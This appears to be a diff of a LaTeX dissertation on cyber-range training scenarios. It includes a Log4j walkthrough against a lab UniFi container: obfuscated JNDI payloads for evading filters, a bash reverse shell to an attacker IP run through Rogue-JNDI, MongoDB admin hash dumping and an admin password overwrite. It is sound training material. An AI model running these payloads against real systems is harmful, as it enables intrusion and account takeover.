@@ -466,39 +466,39 @@ The \textit{entry point} role performs the necessary tasks to configure a certai
 
 The \textit{mesh} role handles devices that need to join the Tailscale network, called \textit{tailnet}. As explained in Section \ref{sec:selected_tools_tailscale}, this network allows communication between each device that belongs to it. This is useful when focusing on cloud deployments if we, for instance, want to connect to port 6080 on our attacker machine to be able to control it remotely and, as we will see, in the Windows-based scenarios to access the Windows Vagrant box using \textit{remote desktop}. 
 
-This role's actions start by installing Tailscale and starting the \textit{tailscaled} service. After this, the container is instructed to join a specific Tailscale network using an authentication key and by specifying a hostname for the machine. An authentication key allows the addition of new nodes to the Tailscale network without needing to sign in to the network. As such, a reusable authentication key was created to connect multiple nodes to the network. Each time a new node joins the Tailscale network using this authentication key, it enters the group of Tailscale ephemeral nodes, which essentially refer to short-lived devices that are automatically removed from the network after a short period of inactivity and are immediately removed from the network in case they are instructed to do so. Also, the usage of the same hostname for a particular machine allows accessing it using a Tailscale feature called ``MagicDNS'' which essentially registers all the DNS names for the network's devices using the following logic: \texttt{[Device Hostname].[Network DNS Name]}
+This role's actions start by installing Tailscale and starting the \textit{tailscaled} service. After this, the container is instructed to join a specific Tailscale network using an authentication key and by specifying a hostname for the machine. An authentication key allows the addition of new nodes to the Tailscale network without needing to sign in to the network. A reusable authentication key was created to connect multiple nodes to the network. Each time a new node joins the Tailscale network using this authentication key, it enters the group of Tailscale ephemeral nodes, which essentially refer to short-lived devices that are automatically removed from the network after a short period of inactivity and are immediately removed from the network in case they are instructed to do so. Also, the usage of the same hostname for a particular machine allows accessing it using a Tailscale feature called ``MagicDNS'' which essentially registers all the DNS names for the network's devices using the following logic: \texttt{[Device Hostname].[Network DNS Name]}
 The device's hostname was already mentioned above. By default, the network's DNS name is chosen by Tailscale upon the first usage. The ``MagicDNS'' configuration provides easy access to machines when they are not under our control. This will be very useful in the chapter of \textbf{CLOUD DEPLOYMENT}.
 
 \section{Custom Scenarios} \label{sec:validation_custom_scenarios}
 
-The set of custom scenarios involve three distinct cyber ranges:
+The set of custom scenarios involves three distinct cyber ranges:
 
 \begin{itemize}
     \item A Linux scenario that explores the Apache Log4j vulnerability (CVE-2021-44228).
     \item A Windows-based scenario that explores a Ransomware malware executable that encrypts a set of files.
-    \item A Windows-based scenario that exposes a vulnerable Active Directory Domain Controller that provides a wide attack surface where the trainee can experiment several attacks. 
+    \item A Windows-based scenario that exposes a vulnerable Active Directory Domain Controller that provides a vast attack surface where the trainee can experiment with several attacks. 
 \end{itemize}
 
 For each challenge, details on how to solve them will be revealed. We will present some of the intended solutions to get the secret flag and, when available, unintended solutions.
 
 \subsection{Log4j Scenario} \label{sec:validation_log4j_scenario}
 
-The Apache Log4j vulnerability started haunting the world during the last month of the year of 2021. It was based on the Java-based logging package Apache Log4j and essentially allowed an attacker to execute code on a remote server, the so-called Remote Code Execution (RCE). The scope of machines this vulnerability targeted was huge and some put it in the same level of the most serious vulnerability along with \textit{Heartbleed} and \textit{Shellshock}. CVE-2021-4428\footnote{\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228}} details which Log4j versions were affected and gives a brief insight of what is the vulnerability about. In simple words, an attacker that can control log messages may run arbitrary code by means of a process called message lookup substitution.
+The Apache Log4j vulnerability started haunting the world during the last month of 2021. It was based on the Java-based logging package Apache Log4j and essentially allowed an attacker to execute code on a remote server, the so-called Remote Code Execution (RCE). The scope of machines this vulnerability targeted was enormous, and some put it on the same level as the most severe vulnerability along with \textit{Heartbleed} and \textit{Shellshock}. CVE-2021-4428\footnote{\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228}} details which Log4j versions were affected and give a brief insight into what is the vulnerability about. In simple words, an attacker that can control log messages may run arbitrary code by means of a process called message lookup substitution.
 
-Back in 2013, there was an upgrade in the Log4j package: the ``JNDILookup plugin''. JNDI means Java Naming and Directory Interface, and is a directory service that allows finding data in the form of a Java object through a directory. A directory service is essentially a database for storing information on users and resources. It is often used to manage access privileges, monitor, and control access to applications and infrastructure resources. JNDI supports a wide variety of directory services, being the most famous the Lightweight Directory Access Protocol (LDAP). This was the most targeted directory service in Log4j exploits. Java programs may use JNDI and LDAP together to find a Java object containing specific data. For instance, an URL such as \texttt{ldap://localhost:389/o=FEUPThesis} retrieves information on the \textit{FEUPThesis} object from the LDAP server running in port 389 of the same machine. In this example we used the combination \textit{localhost:389}, but the LDAP server could be potentially located anywhere on the internet. If an attacker controls the above-mentioned LDAP URL then this means they can potentially cause a program to load a malicious object from a server under their control and get remote execution control over a machine.
+Back in 2013, there was an upgrade in the Log4j package: the ``JNDILookup plugin''. JNDI means Java Naming and Directory Interface and is a directory service that allows finding data in the form of a Java object through a directory. A directory service is a database for storing information on users and resources. It is often used to manage access privileges, monitor and control access to applications and infrastructure resources. JNDI supports a wide variety of directory services, being the most famous, the Lightweight Directory Access Protocol (LDAP). This was the most targeted directory service in Log4j exploits. Java programs may use JNDI and LDAP together to find a Java object containing specific data. For instance, an URL such as \texttt{ldap://localhost:389/o=FEUPThesis} retrieves information on the \textit{FEUPThesis} object from the LDAP server running in port 389 of the same machine. In this example, we used the combination \textit{localhost:389}, but the LDAP server could be located anywhere on the internet. If an attacker controls the above-mentioned LDAP URL then this means they can potentially cause a program to load a malicious object from a server under their control and get remote execution control over a machine.
 
-Apache Log4j's syntax\footnote{\url{https://logging.apache.org/log4j/2.x/manual/configuration.html}} follows the pattern \texttt{\$\{prefix:name\}} where \texttt{prefix} is a lookup in the list of available lookups\footnote{\url{https://logging.apache.org/log4j/2.x/manual/lookups.html}}. Other examples, such as \texttt{\$\{java:version\}} would also be accepted and, in this case, would retrieve the current version of Java. Lookup messages were allowed to be used both in the Log4j configuration an in logged messages. The latter was what caused the vulnerability.
+Apache Log4j's syntax\footnote{\url{https://logging.apache.org/log4j/2.x/manual/configuration.html}} follows the pattern \texttt{\$\{prefix:name\}} where \texttt{prefix} is a lookup in the list of available lookups\footnote{\url{https://logging.apache.org/log4j/2.x/manual/lookups.html}}. Other examples, such as \texttt{\$\{java:version\}}, would also be accepted and, in this case, would retrieve the current version of Java. Lookup messages were allowed to be used in the Log4j configuration and logged messages. The latter was what caused the vulnerability.
 
-All the attacker has to do is find an input that gets logged and add a malicious JNDI query that includes a malicious LDAP server controlled by the attacker. On web servers logged information typically includes the \textit{User-Agent} HTTP header or the inputted \textit{username}, for instance.
+All the attacker has to do is find an input that gets logged and add a malicious JNDI query that includes a malicious LDAP server controlled by the attacker. On web servers, logged information typically consists of the \textit{User-Agent} HTTP header or the inputted \textit{username}, for instance.
 
-There are techniques that can be used to evade simplistic blocking of strings like \texttt{\$\{jndi:ldap} by using some features of Log4j. For instance, we can use the \texttt{\$\{lower\}} feature which lowercases characters: \texttt{\$\{jndi:\$\{lower:l\}\$\{lower:d\}a\$\{lower:p\}://example.com/x\}}. The usage of the \texttt{:-} syntax which enables the attacker to set a default value for a lookup and if the value looked up does not exist, then the predefined default value is considered:
+Some techniques can be used to evade simplistic blocking of strings like \texttt{\$\{jndi:ldap} by using some features of Log4j. For instance, we can use the \texttt{\$\{lower\}} feature which lowercases characters: \texttt{\$\{jndi:\$\{lower:l\}\$\{lower:d\}a\$\{lower:p\}://example.com/x\}}. The usage of the \texttt{:-} syntax enables the attacker to set a default value for a lookup, and if the value looked up does not exist, then the predefined default value is considered:
 
 \texttt{\$\{jndi:\$\{env:NOTEXIST:-l\}d\$\{env:NOTEXIST:-a\}\$\{env:NOTEXIST:-p\}}
 
 
 Similar techniques use strings like \texttt{\$\{\$\{::-j\}\$\{::-n\}\$\{::-d\}\$\{::-i\}}. Other techniques include encoding \textit{\$\{} as \textit{\%24\%7B} or \textit{\textbackslash u0024\textbackslash u007b}.
 
-During this period of cyber war if we can call it that way, there were attempts to gather information on the target machine using crafted strings. Several attempts were made to gather the machine users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, hostnames, among others, as shown in Listing \ref{lst:log4j_crafted_string}.
+During this period of cyber war, there were attempts to gather information on the target machine using crafted strings. Several attempts were made to collect the machine users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, and hostnames, among others, as shown in Listing \ref{lst:log4j_crafted_string}.
 
 \clearpage
 
@@ -510,13 +510,13 @@ ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
 _PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
 \end{lstlisting}
 
-\subsection{Scenario Construction} \label{sec:validation_log4j_scenario_construction}
+\subsubsection{Scenario Construction} \label{sec:validation_log4j_scenario_construction}
 
-This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked a bit the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
+This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
 and removing the \texttt{JVM\_EXTRA\_OPTS=-Dlog4j2.formatMsgNoLookups\\=true} environment variable that disables variable lookups, which was turning the network application to be not vulnerable to Log4j exploit. It's also important to refer that this configuration uses a MongoDB database that supports the UniFi Network Application, where users are saved.
 
 % CA
-At first we could not get an HTTPS connection with UniFi's dashboard as a default CA certificate was generated by an untrusted CA. Therefore, it was time to create our Certificate Authority that was responsible for issuing the signed public-key digital certificates associated with a predefined domain name. By turning our create CA into trusted in the target device, it was possible to achieve an HTTPS connection. Listing \ref{lst:cmd_commands_unifi_ca} presents the commands that were used to create the CA's key pair, generating a CSR with the \textit{subjectAltName} extension, and getting the final public-key certificate signed by the new root CA, as well as the private key's password protection removed:
+At first, we could not get an HTTPS connection with UniFi's dashboard as a default CA certificate was generated by an untrusted CA. Therefore, it was time to create our Certificate Authority, which is responsible for issuing the signed public-key digital certificates associated with a predefined domain name. Turning our created CA into trusted in the target device made it possible to achieve an HTTPS connection. Listing \ref{lst:cmd_commands_unifi_ca} presents the commands that were used to create the CA's key pair, generating a CSR with the \textit{subjectAltName} extension, and getting the final public-key certificate signed by the new root CA, as well as the private key's password protection removed:
 
 \lstset{
   language=bash,
@@ -532,7 +532,7 @@ At first we could not get an HTTPS connection with UniFi's dashboard as a defaul
 # Generate CA keys (private and public keys)
 openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt
 
-# Generating Certificate Signing Request (notice the subjectAltName which is mandatory, at least in Firefox!)
+# Generating Certificate Signing Request (notice the subjectAltName, which is mandatory, at least in Firefox!)
 openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj "/CN=example-domain.ui.com/O=UniFi/C=US" -passout pass:pass -addext "subjectAltName = DNS:example-domain.ui.com"
 
 # Generate Server Public-key Certificate
@@ -550,13 +550,13 @@ The steps to load the certificates into the Docker container were as follows:
     \item Insert also in the certificates folder the PEM format SSL certificate with the full certificate chain. under the name of \texttt{fullchain.pem}.
 \end{enumerate}
 
-The private key file belonging to UniFi's dashboard domain was obtain in the last command form Listing \ref{lst:cmd_commands_unifi_ca}. The full chain file is simply a concatenation of the public-key certificates of the CA and the \texttt{example-domain.ui.com} domain. 
+The private key file belonging to UniFi's dashboard domain was obtained in the final command form Listing \ref{lst:cmd_commands_unifi_ca}. The full chain file is simply a concatenation of the public-key certificates of the CA and the \texttt{example-domain.ui.com} domain. 
 
-Furthermore, changes in the entry point scripts were made to always reload SSL certificates inside the Docker container. This was not the default behaviour as the Docker image was previously configured to issue a file with the hashes of the files in the certificates folder and check for their existence.
+Furthermore, entry point scripts were changed to always reload SSL certificates inside the Docker container. This was not the default behavior, as the Docker image was previously configured to issue a file with the hashes of the files in the certificates folder and check for their existence.
 
 % Entrypoint Script
 
-After the creation of the above mentioned SSL certificates, there is the need of including the newly created root CA's public-key certificate in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears as a legitimate HTTPS connection. This setup is presented in Listing  achieved with the following entry point script:
+After the creation of the above-mentioned SSL certificates, the newly created root CA's public-key certificate is needed in the attacker machine so it can be considered trustworthy. This way, when the trainee visits the UniFi dashboard, the website appears as a legitimate HTTPS connection. This setup is presented in Listing  achieved with the following entry point script:
 
 \begin{lstlisting}[language=bash,caption=Entrypoint Bash Script.,numbers=none,label={lst:log4j_entrypoint_script}]
 #!/bin/bash
@@ -579,7 +579,7 @@ update-ca-certificates
 cat policies.json > /usr/lib/firefox-esr/distribution/policies.json
 \end{lstlisting}
 
-Every template file is within the scenario's \texttt{setup} folder. Firstly, we run a \textit{python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command which turns our newly placed root CA certificate as system-wide trusted. So, every digital certificate signed by this new root CA will be deemed as safe. After this, we need Firefox browser to also consider this CA as safe. So we copied the \texttt{policies.json} file into a special folder.
+Every template file is within the scenario's \texttt{setup} folder. Firstly, we run a \textit{python} script that will be promptly explained. Then, we copy the root CA's public-key certificate into a special \texttt{ca-certificates} folder and run the \texttt{update-ca-certificates} command, which turns our newly placed root CA certificate into system-wide trusted. So, every digital certificate signed by this new root CA will be deemed safe. After this, we need the Firefox browser to consider this CA safe. So we copied the \texttt{policies.json} file into a special folder.
 
 \begin{lstlisting}[caption=Firefox's Policies File.,numbers=none,label={lst:firefox_json_policies}]
 {
@@ -595,11 +595,11 @@ Every template file is within the scenario's \texttt{setup} folder. Firstly, we 
   }
 \end{lstlisting}
 
-Listing \ref{lst:firefox_json_policies} presents the policies file which is read on every Firefox's new execution.
+Listing \ref{lst:firefox_json_policies} presents the policies file, which is read on every Firefox's new execution.
 
 % Selenium
 
-After loading the SSL certificates we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there was a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to remotely instruct the behavior of the browser. The tasks performed by Selenium can summarized in:
+After loading the SSL certificates, we obtained the desired effect, an HTTPS connection when loading UniFi's dashboard. Still, there was a slight problem. When hitting the dashboard's web page for the first time, the initial wizard setup was shown. We had to overcome this by creating a Selenium script (\textit{setup.py} shown in Listing \ref{lst:log4j_entrypoint_script}) for this effect using Firefox's \textit{WebDriver} as a way to instruct the behavior of the browser remotely. The tasks performed by Selenium can be summarized in:
 
 \begin{itemize}
     \item Visiting UniFi's web dashboard page.
@@ -607,11 +607,11 @@ After loading the SSL certificates we obtained the desired effect, an HTTPS conn
     \item Clicking several wizard setup buttons to move onto more advanced setup stages.
 \end{itemize}
 
-\subsection{Exploit} \label{sec:validation_log4j_exploit}
+\subsubsection{Exploit} \label{sec:validation_log4j_exploit}
 
 The goal of the Log4j exploit on UniFi's software is to obtain a reverse shell, get the secret flag, and leverage access to get the administrative credentials on the UniFi MongoDB instance.
 
-Initially we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443 which is where UniFi's interface is in.
+Initially, we can dig a little into the reconnaissance process and check which ports are open by default in the victim machine using \texttt{nmap}. We can see port 8443, which is where UniFi's interface is.
 
 \begin{lstlisting}[caption=Nmap output over victim machine.,numbers=none,label={lst:nmap_victim}]
 # nmap -Pn example-domain.ui.com
@@ -637,7 +637,7 @@ Then, we access the \texttt{https://example-domain.ui.com:8443} domain and get t
     \label{fig:log4j_unifi_initial_dashboard}
 \end{figure}
 
-As mentioned earlier, we need to target a field that we know it will be logged by Apache Log4j, using a malicious JNDI query. In our case it is the \texttt{remember} field of the POST request.
+As mentioned earlier, we need to target a field we know will be logged by Apache Log4j using a malicious JNDI query. In our case, it is the \texttt{remember} field of the POST request.
 
 \begin{lstlisting}[caption=UniFi Dashboard POST Request.,numbers=none,label={lst:unifi_post_request}]
 POST /api/login HTTP/1.1
@@ -658,21 +658,21 @@ Sec-Fetch-Site: same-origin
 {"username":"myuser","password":"mypassword","remember":false,"strict":true}
 \end{lstlisting}
 
-Then we need to test if the web application is vulnerable to the Log4j attack. First we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the example request of Listing \ref{lst:unifi_post_request} we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request:
+Then we must test if the web application is vulnerable to the Log4j attack. First, we listen for connections on port 9999 using \texttt{netcat} with: \texttt{nc -lnvp 9999}. From the example request of Listing \ref{lst:unifi_post_request} we only need to change the \texttt{remember} field to \texttt{\$\{jndi:ldap://172.152.0.2:9\\999/whatever\}} and issue the modified POST request:
 
 \begin{lstlisting}[caption=Issuing Malicious POST Request.,numbers=none,label={lst:unifi_malicious_post_request}]
 curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:9999/whatever}","strict":true}'
 \end{lstlisting}
 
-As we get a connection to port 9999 from the vulnerable Log4j container it means the web application is indeed vulnerable to the exploit. Notice \texttt{172.152.0.2} is the attacker machine's IP address. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client, to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 
+As we get a connection to port 9999 from the vulnerable Log4j container, the web application is indeed vulnerable to the exploit. Notice \texttt{172.152.0.2} is the attacker machine's IP address. The next step is to use the Rogue-JNDI GitHub tool\footnote{\url{https://github.com/veracode-research/rogue-jndi}} to obtain a reverse shell on the target. Essentially, this tool sets up a malicious LDAP and HTTP server for JNDI injection attacks. When the tool first receives a connection from the vulnerable client to connect to the local LDAP server, it responds with a malicious entry containing a payload that will be useful to achieve a Remote Code Execution. The steps to build upon this foundation are to stage an LDAP Referral Server that will redirect the initial client request of the victim to an HTTP server where a secondary payload is hosted that will eventually run code on the target. 
 
-The procedures to setup the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Listing \ref{lst:unifi_clone_rogue_jndi}:
+The procedures to set up the exploit include first using \texttt{netcat} to listen for inbound connections on port 4444 with the command \texttt{nc -lnvp 4444} and then following the steps of Listing \ref{lst:unifi_clone_rogue_jndi}:
 
 \begin{enumerate}
     \item Clone the Rogue JNDI tool and build the project into a JAR file using Maven.
-    \item Generate the Base64 payload that will run in the victim's server. It connects to the attacker machine on port 4444, redirecting both the standard input and standard output to the remote machine so the attacker can have full control over the victim.
-    \item Running Rogue JNDI tool to create malicious LDAP and HTTP server with command that will trigger a reverse shell.
-    \item Issue cURL command with malicious JNDI query and run exploit.
+    \item Generate the Base64 payload that will run in the victim's server. It connects to the attacker machine on port 4444, redirecting both the standard input and standard output to the remote machine so the attacker can have complete control over the victim.
+    \item Running Rogue JNDI tool to create malicious LDAP and HTTP server with the command that will trigger a reverse shell.
+    \item Issue cURL command with malicious JNDI query and run the exploit.
 \end{enumerate}
 
 \begin{lstlisting}[language=bash,caption=Cloning Rogue JNDI GitHub Repository.,numbers=none,label={lst:unifi_clone_rogue_jndi}]
@@ -683,19 +683,20 @@ git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mv
 echo 'bash -c bash -i >&/dev/tcp/172.152.0.2/4444 0>&1' | base64
 
 # Running the malicious LDAP and HTTP Server with the Base64 malicious payload. The hostname flag denotes the target HTTP server.
-java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTcyLjE1Mi4wLjIvNDQ0NCAwP
+iYxCg==}|{base64,-d}|{bash,-i}" --hostname "172.152.0.2"
 
 # Running Exploit
 curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://example-domain.ui.com:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://example-domain.ui.com:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"a","password":"a","remember":"${jndi:ldap://172.152.0.2:1389/o=tomcat}","strict":true}'
 \end{lstlisting}
 
-As a result, we obtain a reverse shell in our initial \texttt{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command we can see there is a weird file with the name \texttt{...} (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.
+As a result, we obtain a reverse shell in our initial \texttt{netcat} listener. We now have access to the target server under the \textit{unifi} user. Running a simple \texttt{ls -la} command, we can see there is a weird file with the name \texttt{...} (3 dots). If we open it, we will find the challenge flag \texttt{flag\{l3ts\_un1f1\_every0ne\_l0g4j\}}.
 
-\subsection{Post Exploitation} \label{sec:validation_log4j_post_exploitation}
+\subsubsection{Post Exploitation} \label{sec:validation_log4j_post_exploitation}
 
-Some lateral movement can be performed after getting the reverse shell on the victim. For instance, we can try to crack the administrative credentials for the UniFi network application stored in the MongoDB instance mentioned earlier in the Docker container construction using \texttt{hashcat}. Or, we can add add a new administrative user, for instance. In a real world setup, this would allow access to a whole new range of devices, possibly with some kind of vulnerabilities that would easily allow a way in. Persistence tasks could also be taken into account to allow consistent access to the victim machine.
+Some lateral movement can be performed after getting the reverse shell on the victim. For instance, we can try to crack the administrative credentials for the UniFi network application stored in the MongoDB instance mentioned earlier in the Docker container construction using \texttt{hashcat}. Or, we can add a new administrative user, for example. In an actual world setup, this would allow access to a whole new range of devices, possibly with vulnerabilities that would easily allow a way in. Persistence tasks could also be considered to enable consistent access to the victim's machine.
 
-After getting the reverse shell prompt, we can first check if there really is a MongoDB instance running. We can do this by running \texttt{ps aux | grep mongo}. The result will show port 27117 listening for incoming MongoDB connections. Then, we can check which databases are available and get the contents of the \textit{admin} database.
+After getting the reverse shell prompt, we can first check if a MongoDB instance is running. We can run \texttt{ps aux | grep mongo}. The result will show port 27117 listening for incoming MongoDB connections. Then, we check which databases are available and get the contents of the \textit{admin} database.
 
 \begin{lstlisting}[caption=Fetching Contents of MongoDB Admin Collection.,numbers=none,label={lst:unifi_mongodb_admin_contents}]
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
@@ -712,13 +713,150 @@ MongoDB server version: 3.4.4
 }
 \end{lstlisting}
 
-Listing \ref{lst:unifi_mongodb_admin_contents} shows the existence of an administrator user named \textit{test\_user}, its email and the password hash of the user which can be seen in the \textit{x\_shadow} field. This is a SHA512 hash due to the \textit{\$6\$} characters at the start. As mentioned, it would be possible to crack this hash to get the provided password, however this could take a long time, so we opted for updating the current administrator's password. We first generate a SHA512 hash of the string ``mypassword'' using the command \texttt{mkpasswd -m sha-512 mypassword}. Lastly, the command on Listing \ref{lst:unifi_mongodb_update_admin_password} updates the administrator account password using the previously generated SHA 512 password.
+Listing \ref{lst:unifi_mongodb_admin_contents} shows the existence of an administrator user named \textit{test\_user}, its email, and the password hash of the user, which can be seen in the \textit{x\_shadow} field. This is a SHA512 hash due to the \textit{\$6\$} characters at the start. As mentioned, cracking this hash to get the provided password would be possible. However, this could take a long time, so we opted for updating the current administrator's password. We first generate a SHA512 hash of the string ``mypassword'' using the command \texttt{mkpasswd -m sha-512 mypassword}. Lastly, the command on Listing \ref{lst:unifi_mongodb_update_admin_password} updates the administrator account password using the previously generated SHA 512 password and the \texttt{ObjectId} of the currently existing administrator.
+
+\clearpage
 
 \begin{lstlisting}[caption=Update Administrator User Account Password.,numbers=none,label={lst:unifi_mongodb_update_admin_password}]
 mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("64750f87f19ea8014a2ceb6d")},{$set:{"x_shadow":"$6$zsmtIX0rAM.G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
 CqY5lAOLDNst3xfGQdX99GtpD0."}})'
 \end{lstlisting}
 
-As we result, now the \textit{test\_user} account has the newly replaced password \textit{mypassword}.
+The result is that now the \textit{test\_user} account has the newly replaced password \textit{mypassword}, and we can enter UniFi's network application and completely control it.
 
+\subsection{Ransomware Scenario} \label{sec:validation_ransomware_scenario}
 
+The Ransomware scenario is our first Windows-based scenario and opens the door to this new scope of the dissertation. There were some caveats in setting up this scenario. The initial idea was to combine both Linux scenarios and Windows scenarios. To maintain consistency in the overall project, we wanted to continue using containers, but since the development was based on a Linux host machine, and the underlying operating system resources and drivers used were also Linux-based, there was no way to create Windows containers. This happens because Docker is an OS-Level Virtualization and the Docker daemon provides each container the necessary kernel-level properties for it to be able to run. Due to this, Linux applications run on a Linux machine and Windows applications run on a Windows platform. Still, there are exceptions in Windows due to the existence of \textit{Linux Subsystem}, making it possible for a Linux container to run on Windows. Having this in mind, the solution we came up was to use Linux containers with a KVM installed to run a Windows Vagrant box that would enable remote control. In the case of the Ransomware scenario, the malicious payload comes in the form of an executable (\texttt{.exe}) file and having a Windows machine to run this script was the ideal situation. 
+
+This challenge distinguishes itself compared to the other scenarios because it is not attack-oriented. The final goal stays the same, which is to get the secret flag, but this scenario is forensics-oriented, in the sense that the trainee has to use a set of tools to debug the executable file, understand the consequences of executing the payload, and develop the reverse engineering skills necessary to get the flag.
+
+\subsubsection{Windows Vagrant Box Inside Linux Docker Container} \label{sec:validation_windows_vagrant_inside_linux_docker}
+
+As mentioned earlier, one cannot run Linux and Windows containers simultaneously using the same Docker daemon. The solution to overcome this problem was to install a Windows virtual machine inside a Linux container. From Docker daemon's perspective, all containers are Linux-based, nonetheless, some of those containers run an hypervisor on top of which there is a Windows Vagrant box. Considering that a VM inside a container takes more disk space than other containers, this process reveals itself efficient in terms of disk space compared to running un-containerized VMs. Ultimately, the goal is to configure the Windows machine and access it through Remote Desktop (RDP). One may ask: \textit{Why install a VM inside a container?} This may seem strange to many since there is always the possibility of installing the VM directly on the base OS without needing and extra container layer. However, running a VM inside a container has its own advantages in situations that involve spinning up multiple identical Windows VMs, as it will save tremendous resources (disk, RAM and CPU).
+
+When comparing a scenario where only a single VM runs directly on the base OS, versus a scenario where the VM is containerized, we find both situations consume similar resources. For instance, a single VM that takes 30GB of disk space will take, for instance, 35GB of disk space on a containerized setup. If we run six copies of a VM then the occupied disk space increases to 180GB, as each copy takes the exact amount of disk space. In case of six copies of containerized VMs, the situation slightly differs. In Docker, there are two distinct concepts: images and containers. Images turn out to be read-only and are the core of containers which are created from a read-only layer, the image. On top of this read-only layer, they add their own read-write layer, which differs between each container. Considering the example provided above, where the Docker image size is 35GB, when creating six containerized VMs, each container will only differ in its read-write layer which interacts with the read-only image. Assuming this read-write layer has a size of 10GB, all six containers have combined size of 60GB on top of the 35GB Docker image, making a total of 95GB.
+
+RDP access was a desirable feature in these kind of setups but contrary to what happens in Linux,  Windows containers cannot have a Desktop Environment. Instead, they are designed to run services and applications accessible using the PowerShell command line interface. Unlike Linux containers where the Desktop Environment is an installable component, Windows containers are shipped by Microsoft in a bundle directly with the OS. Microsoft published a set of known base images which form the base of any Windows container and for them there is no installable Desktop Environment component, meaning even if we opted for using Windows containers, the issue of not having the possibility of remotely controlling the UI would be present.
+
+The architecture of the Vagrant box can be seen in Fig. \ref{fig:windows_vagrant_box_architecture}. 
+
+\begin{figure}[H]
+    \includegraphics[width=9cm]{figures/vagrant_box_container_diagram.pdf}
+    \caption{Architecture Of Windows Vagrant Box Inside Docker Container.}
+    \label{fig:windows_vagrant_box_architecture}
+\end{figure}
+
+This setup enables a fully running Windows OS accessible through RDP and containerized an managed by Docker daemon. Five different technologies are worth the mentioning:
+
+\begin{itemize}
+    \item \textbf{Base Operating System}, that will be the main hosting platform.
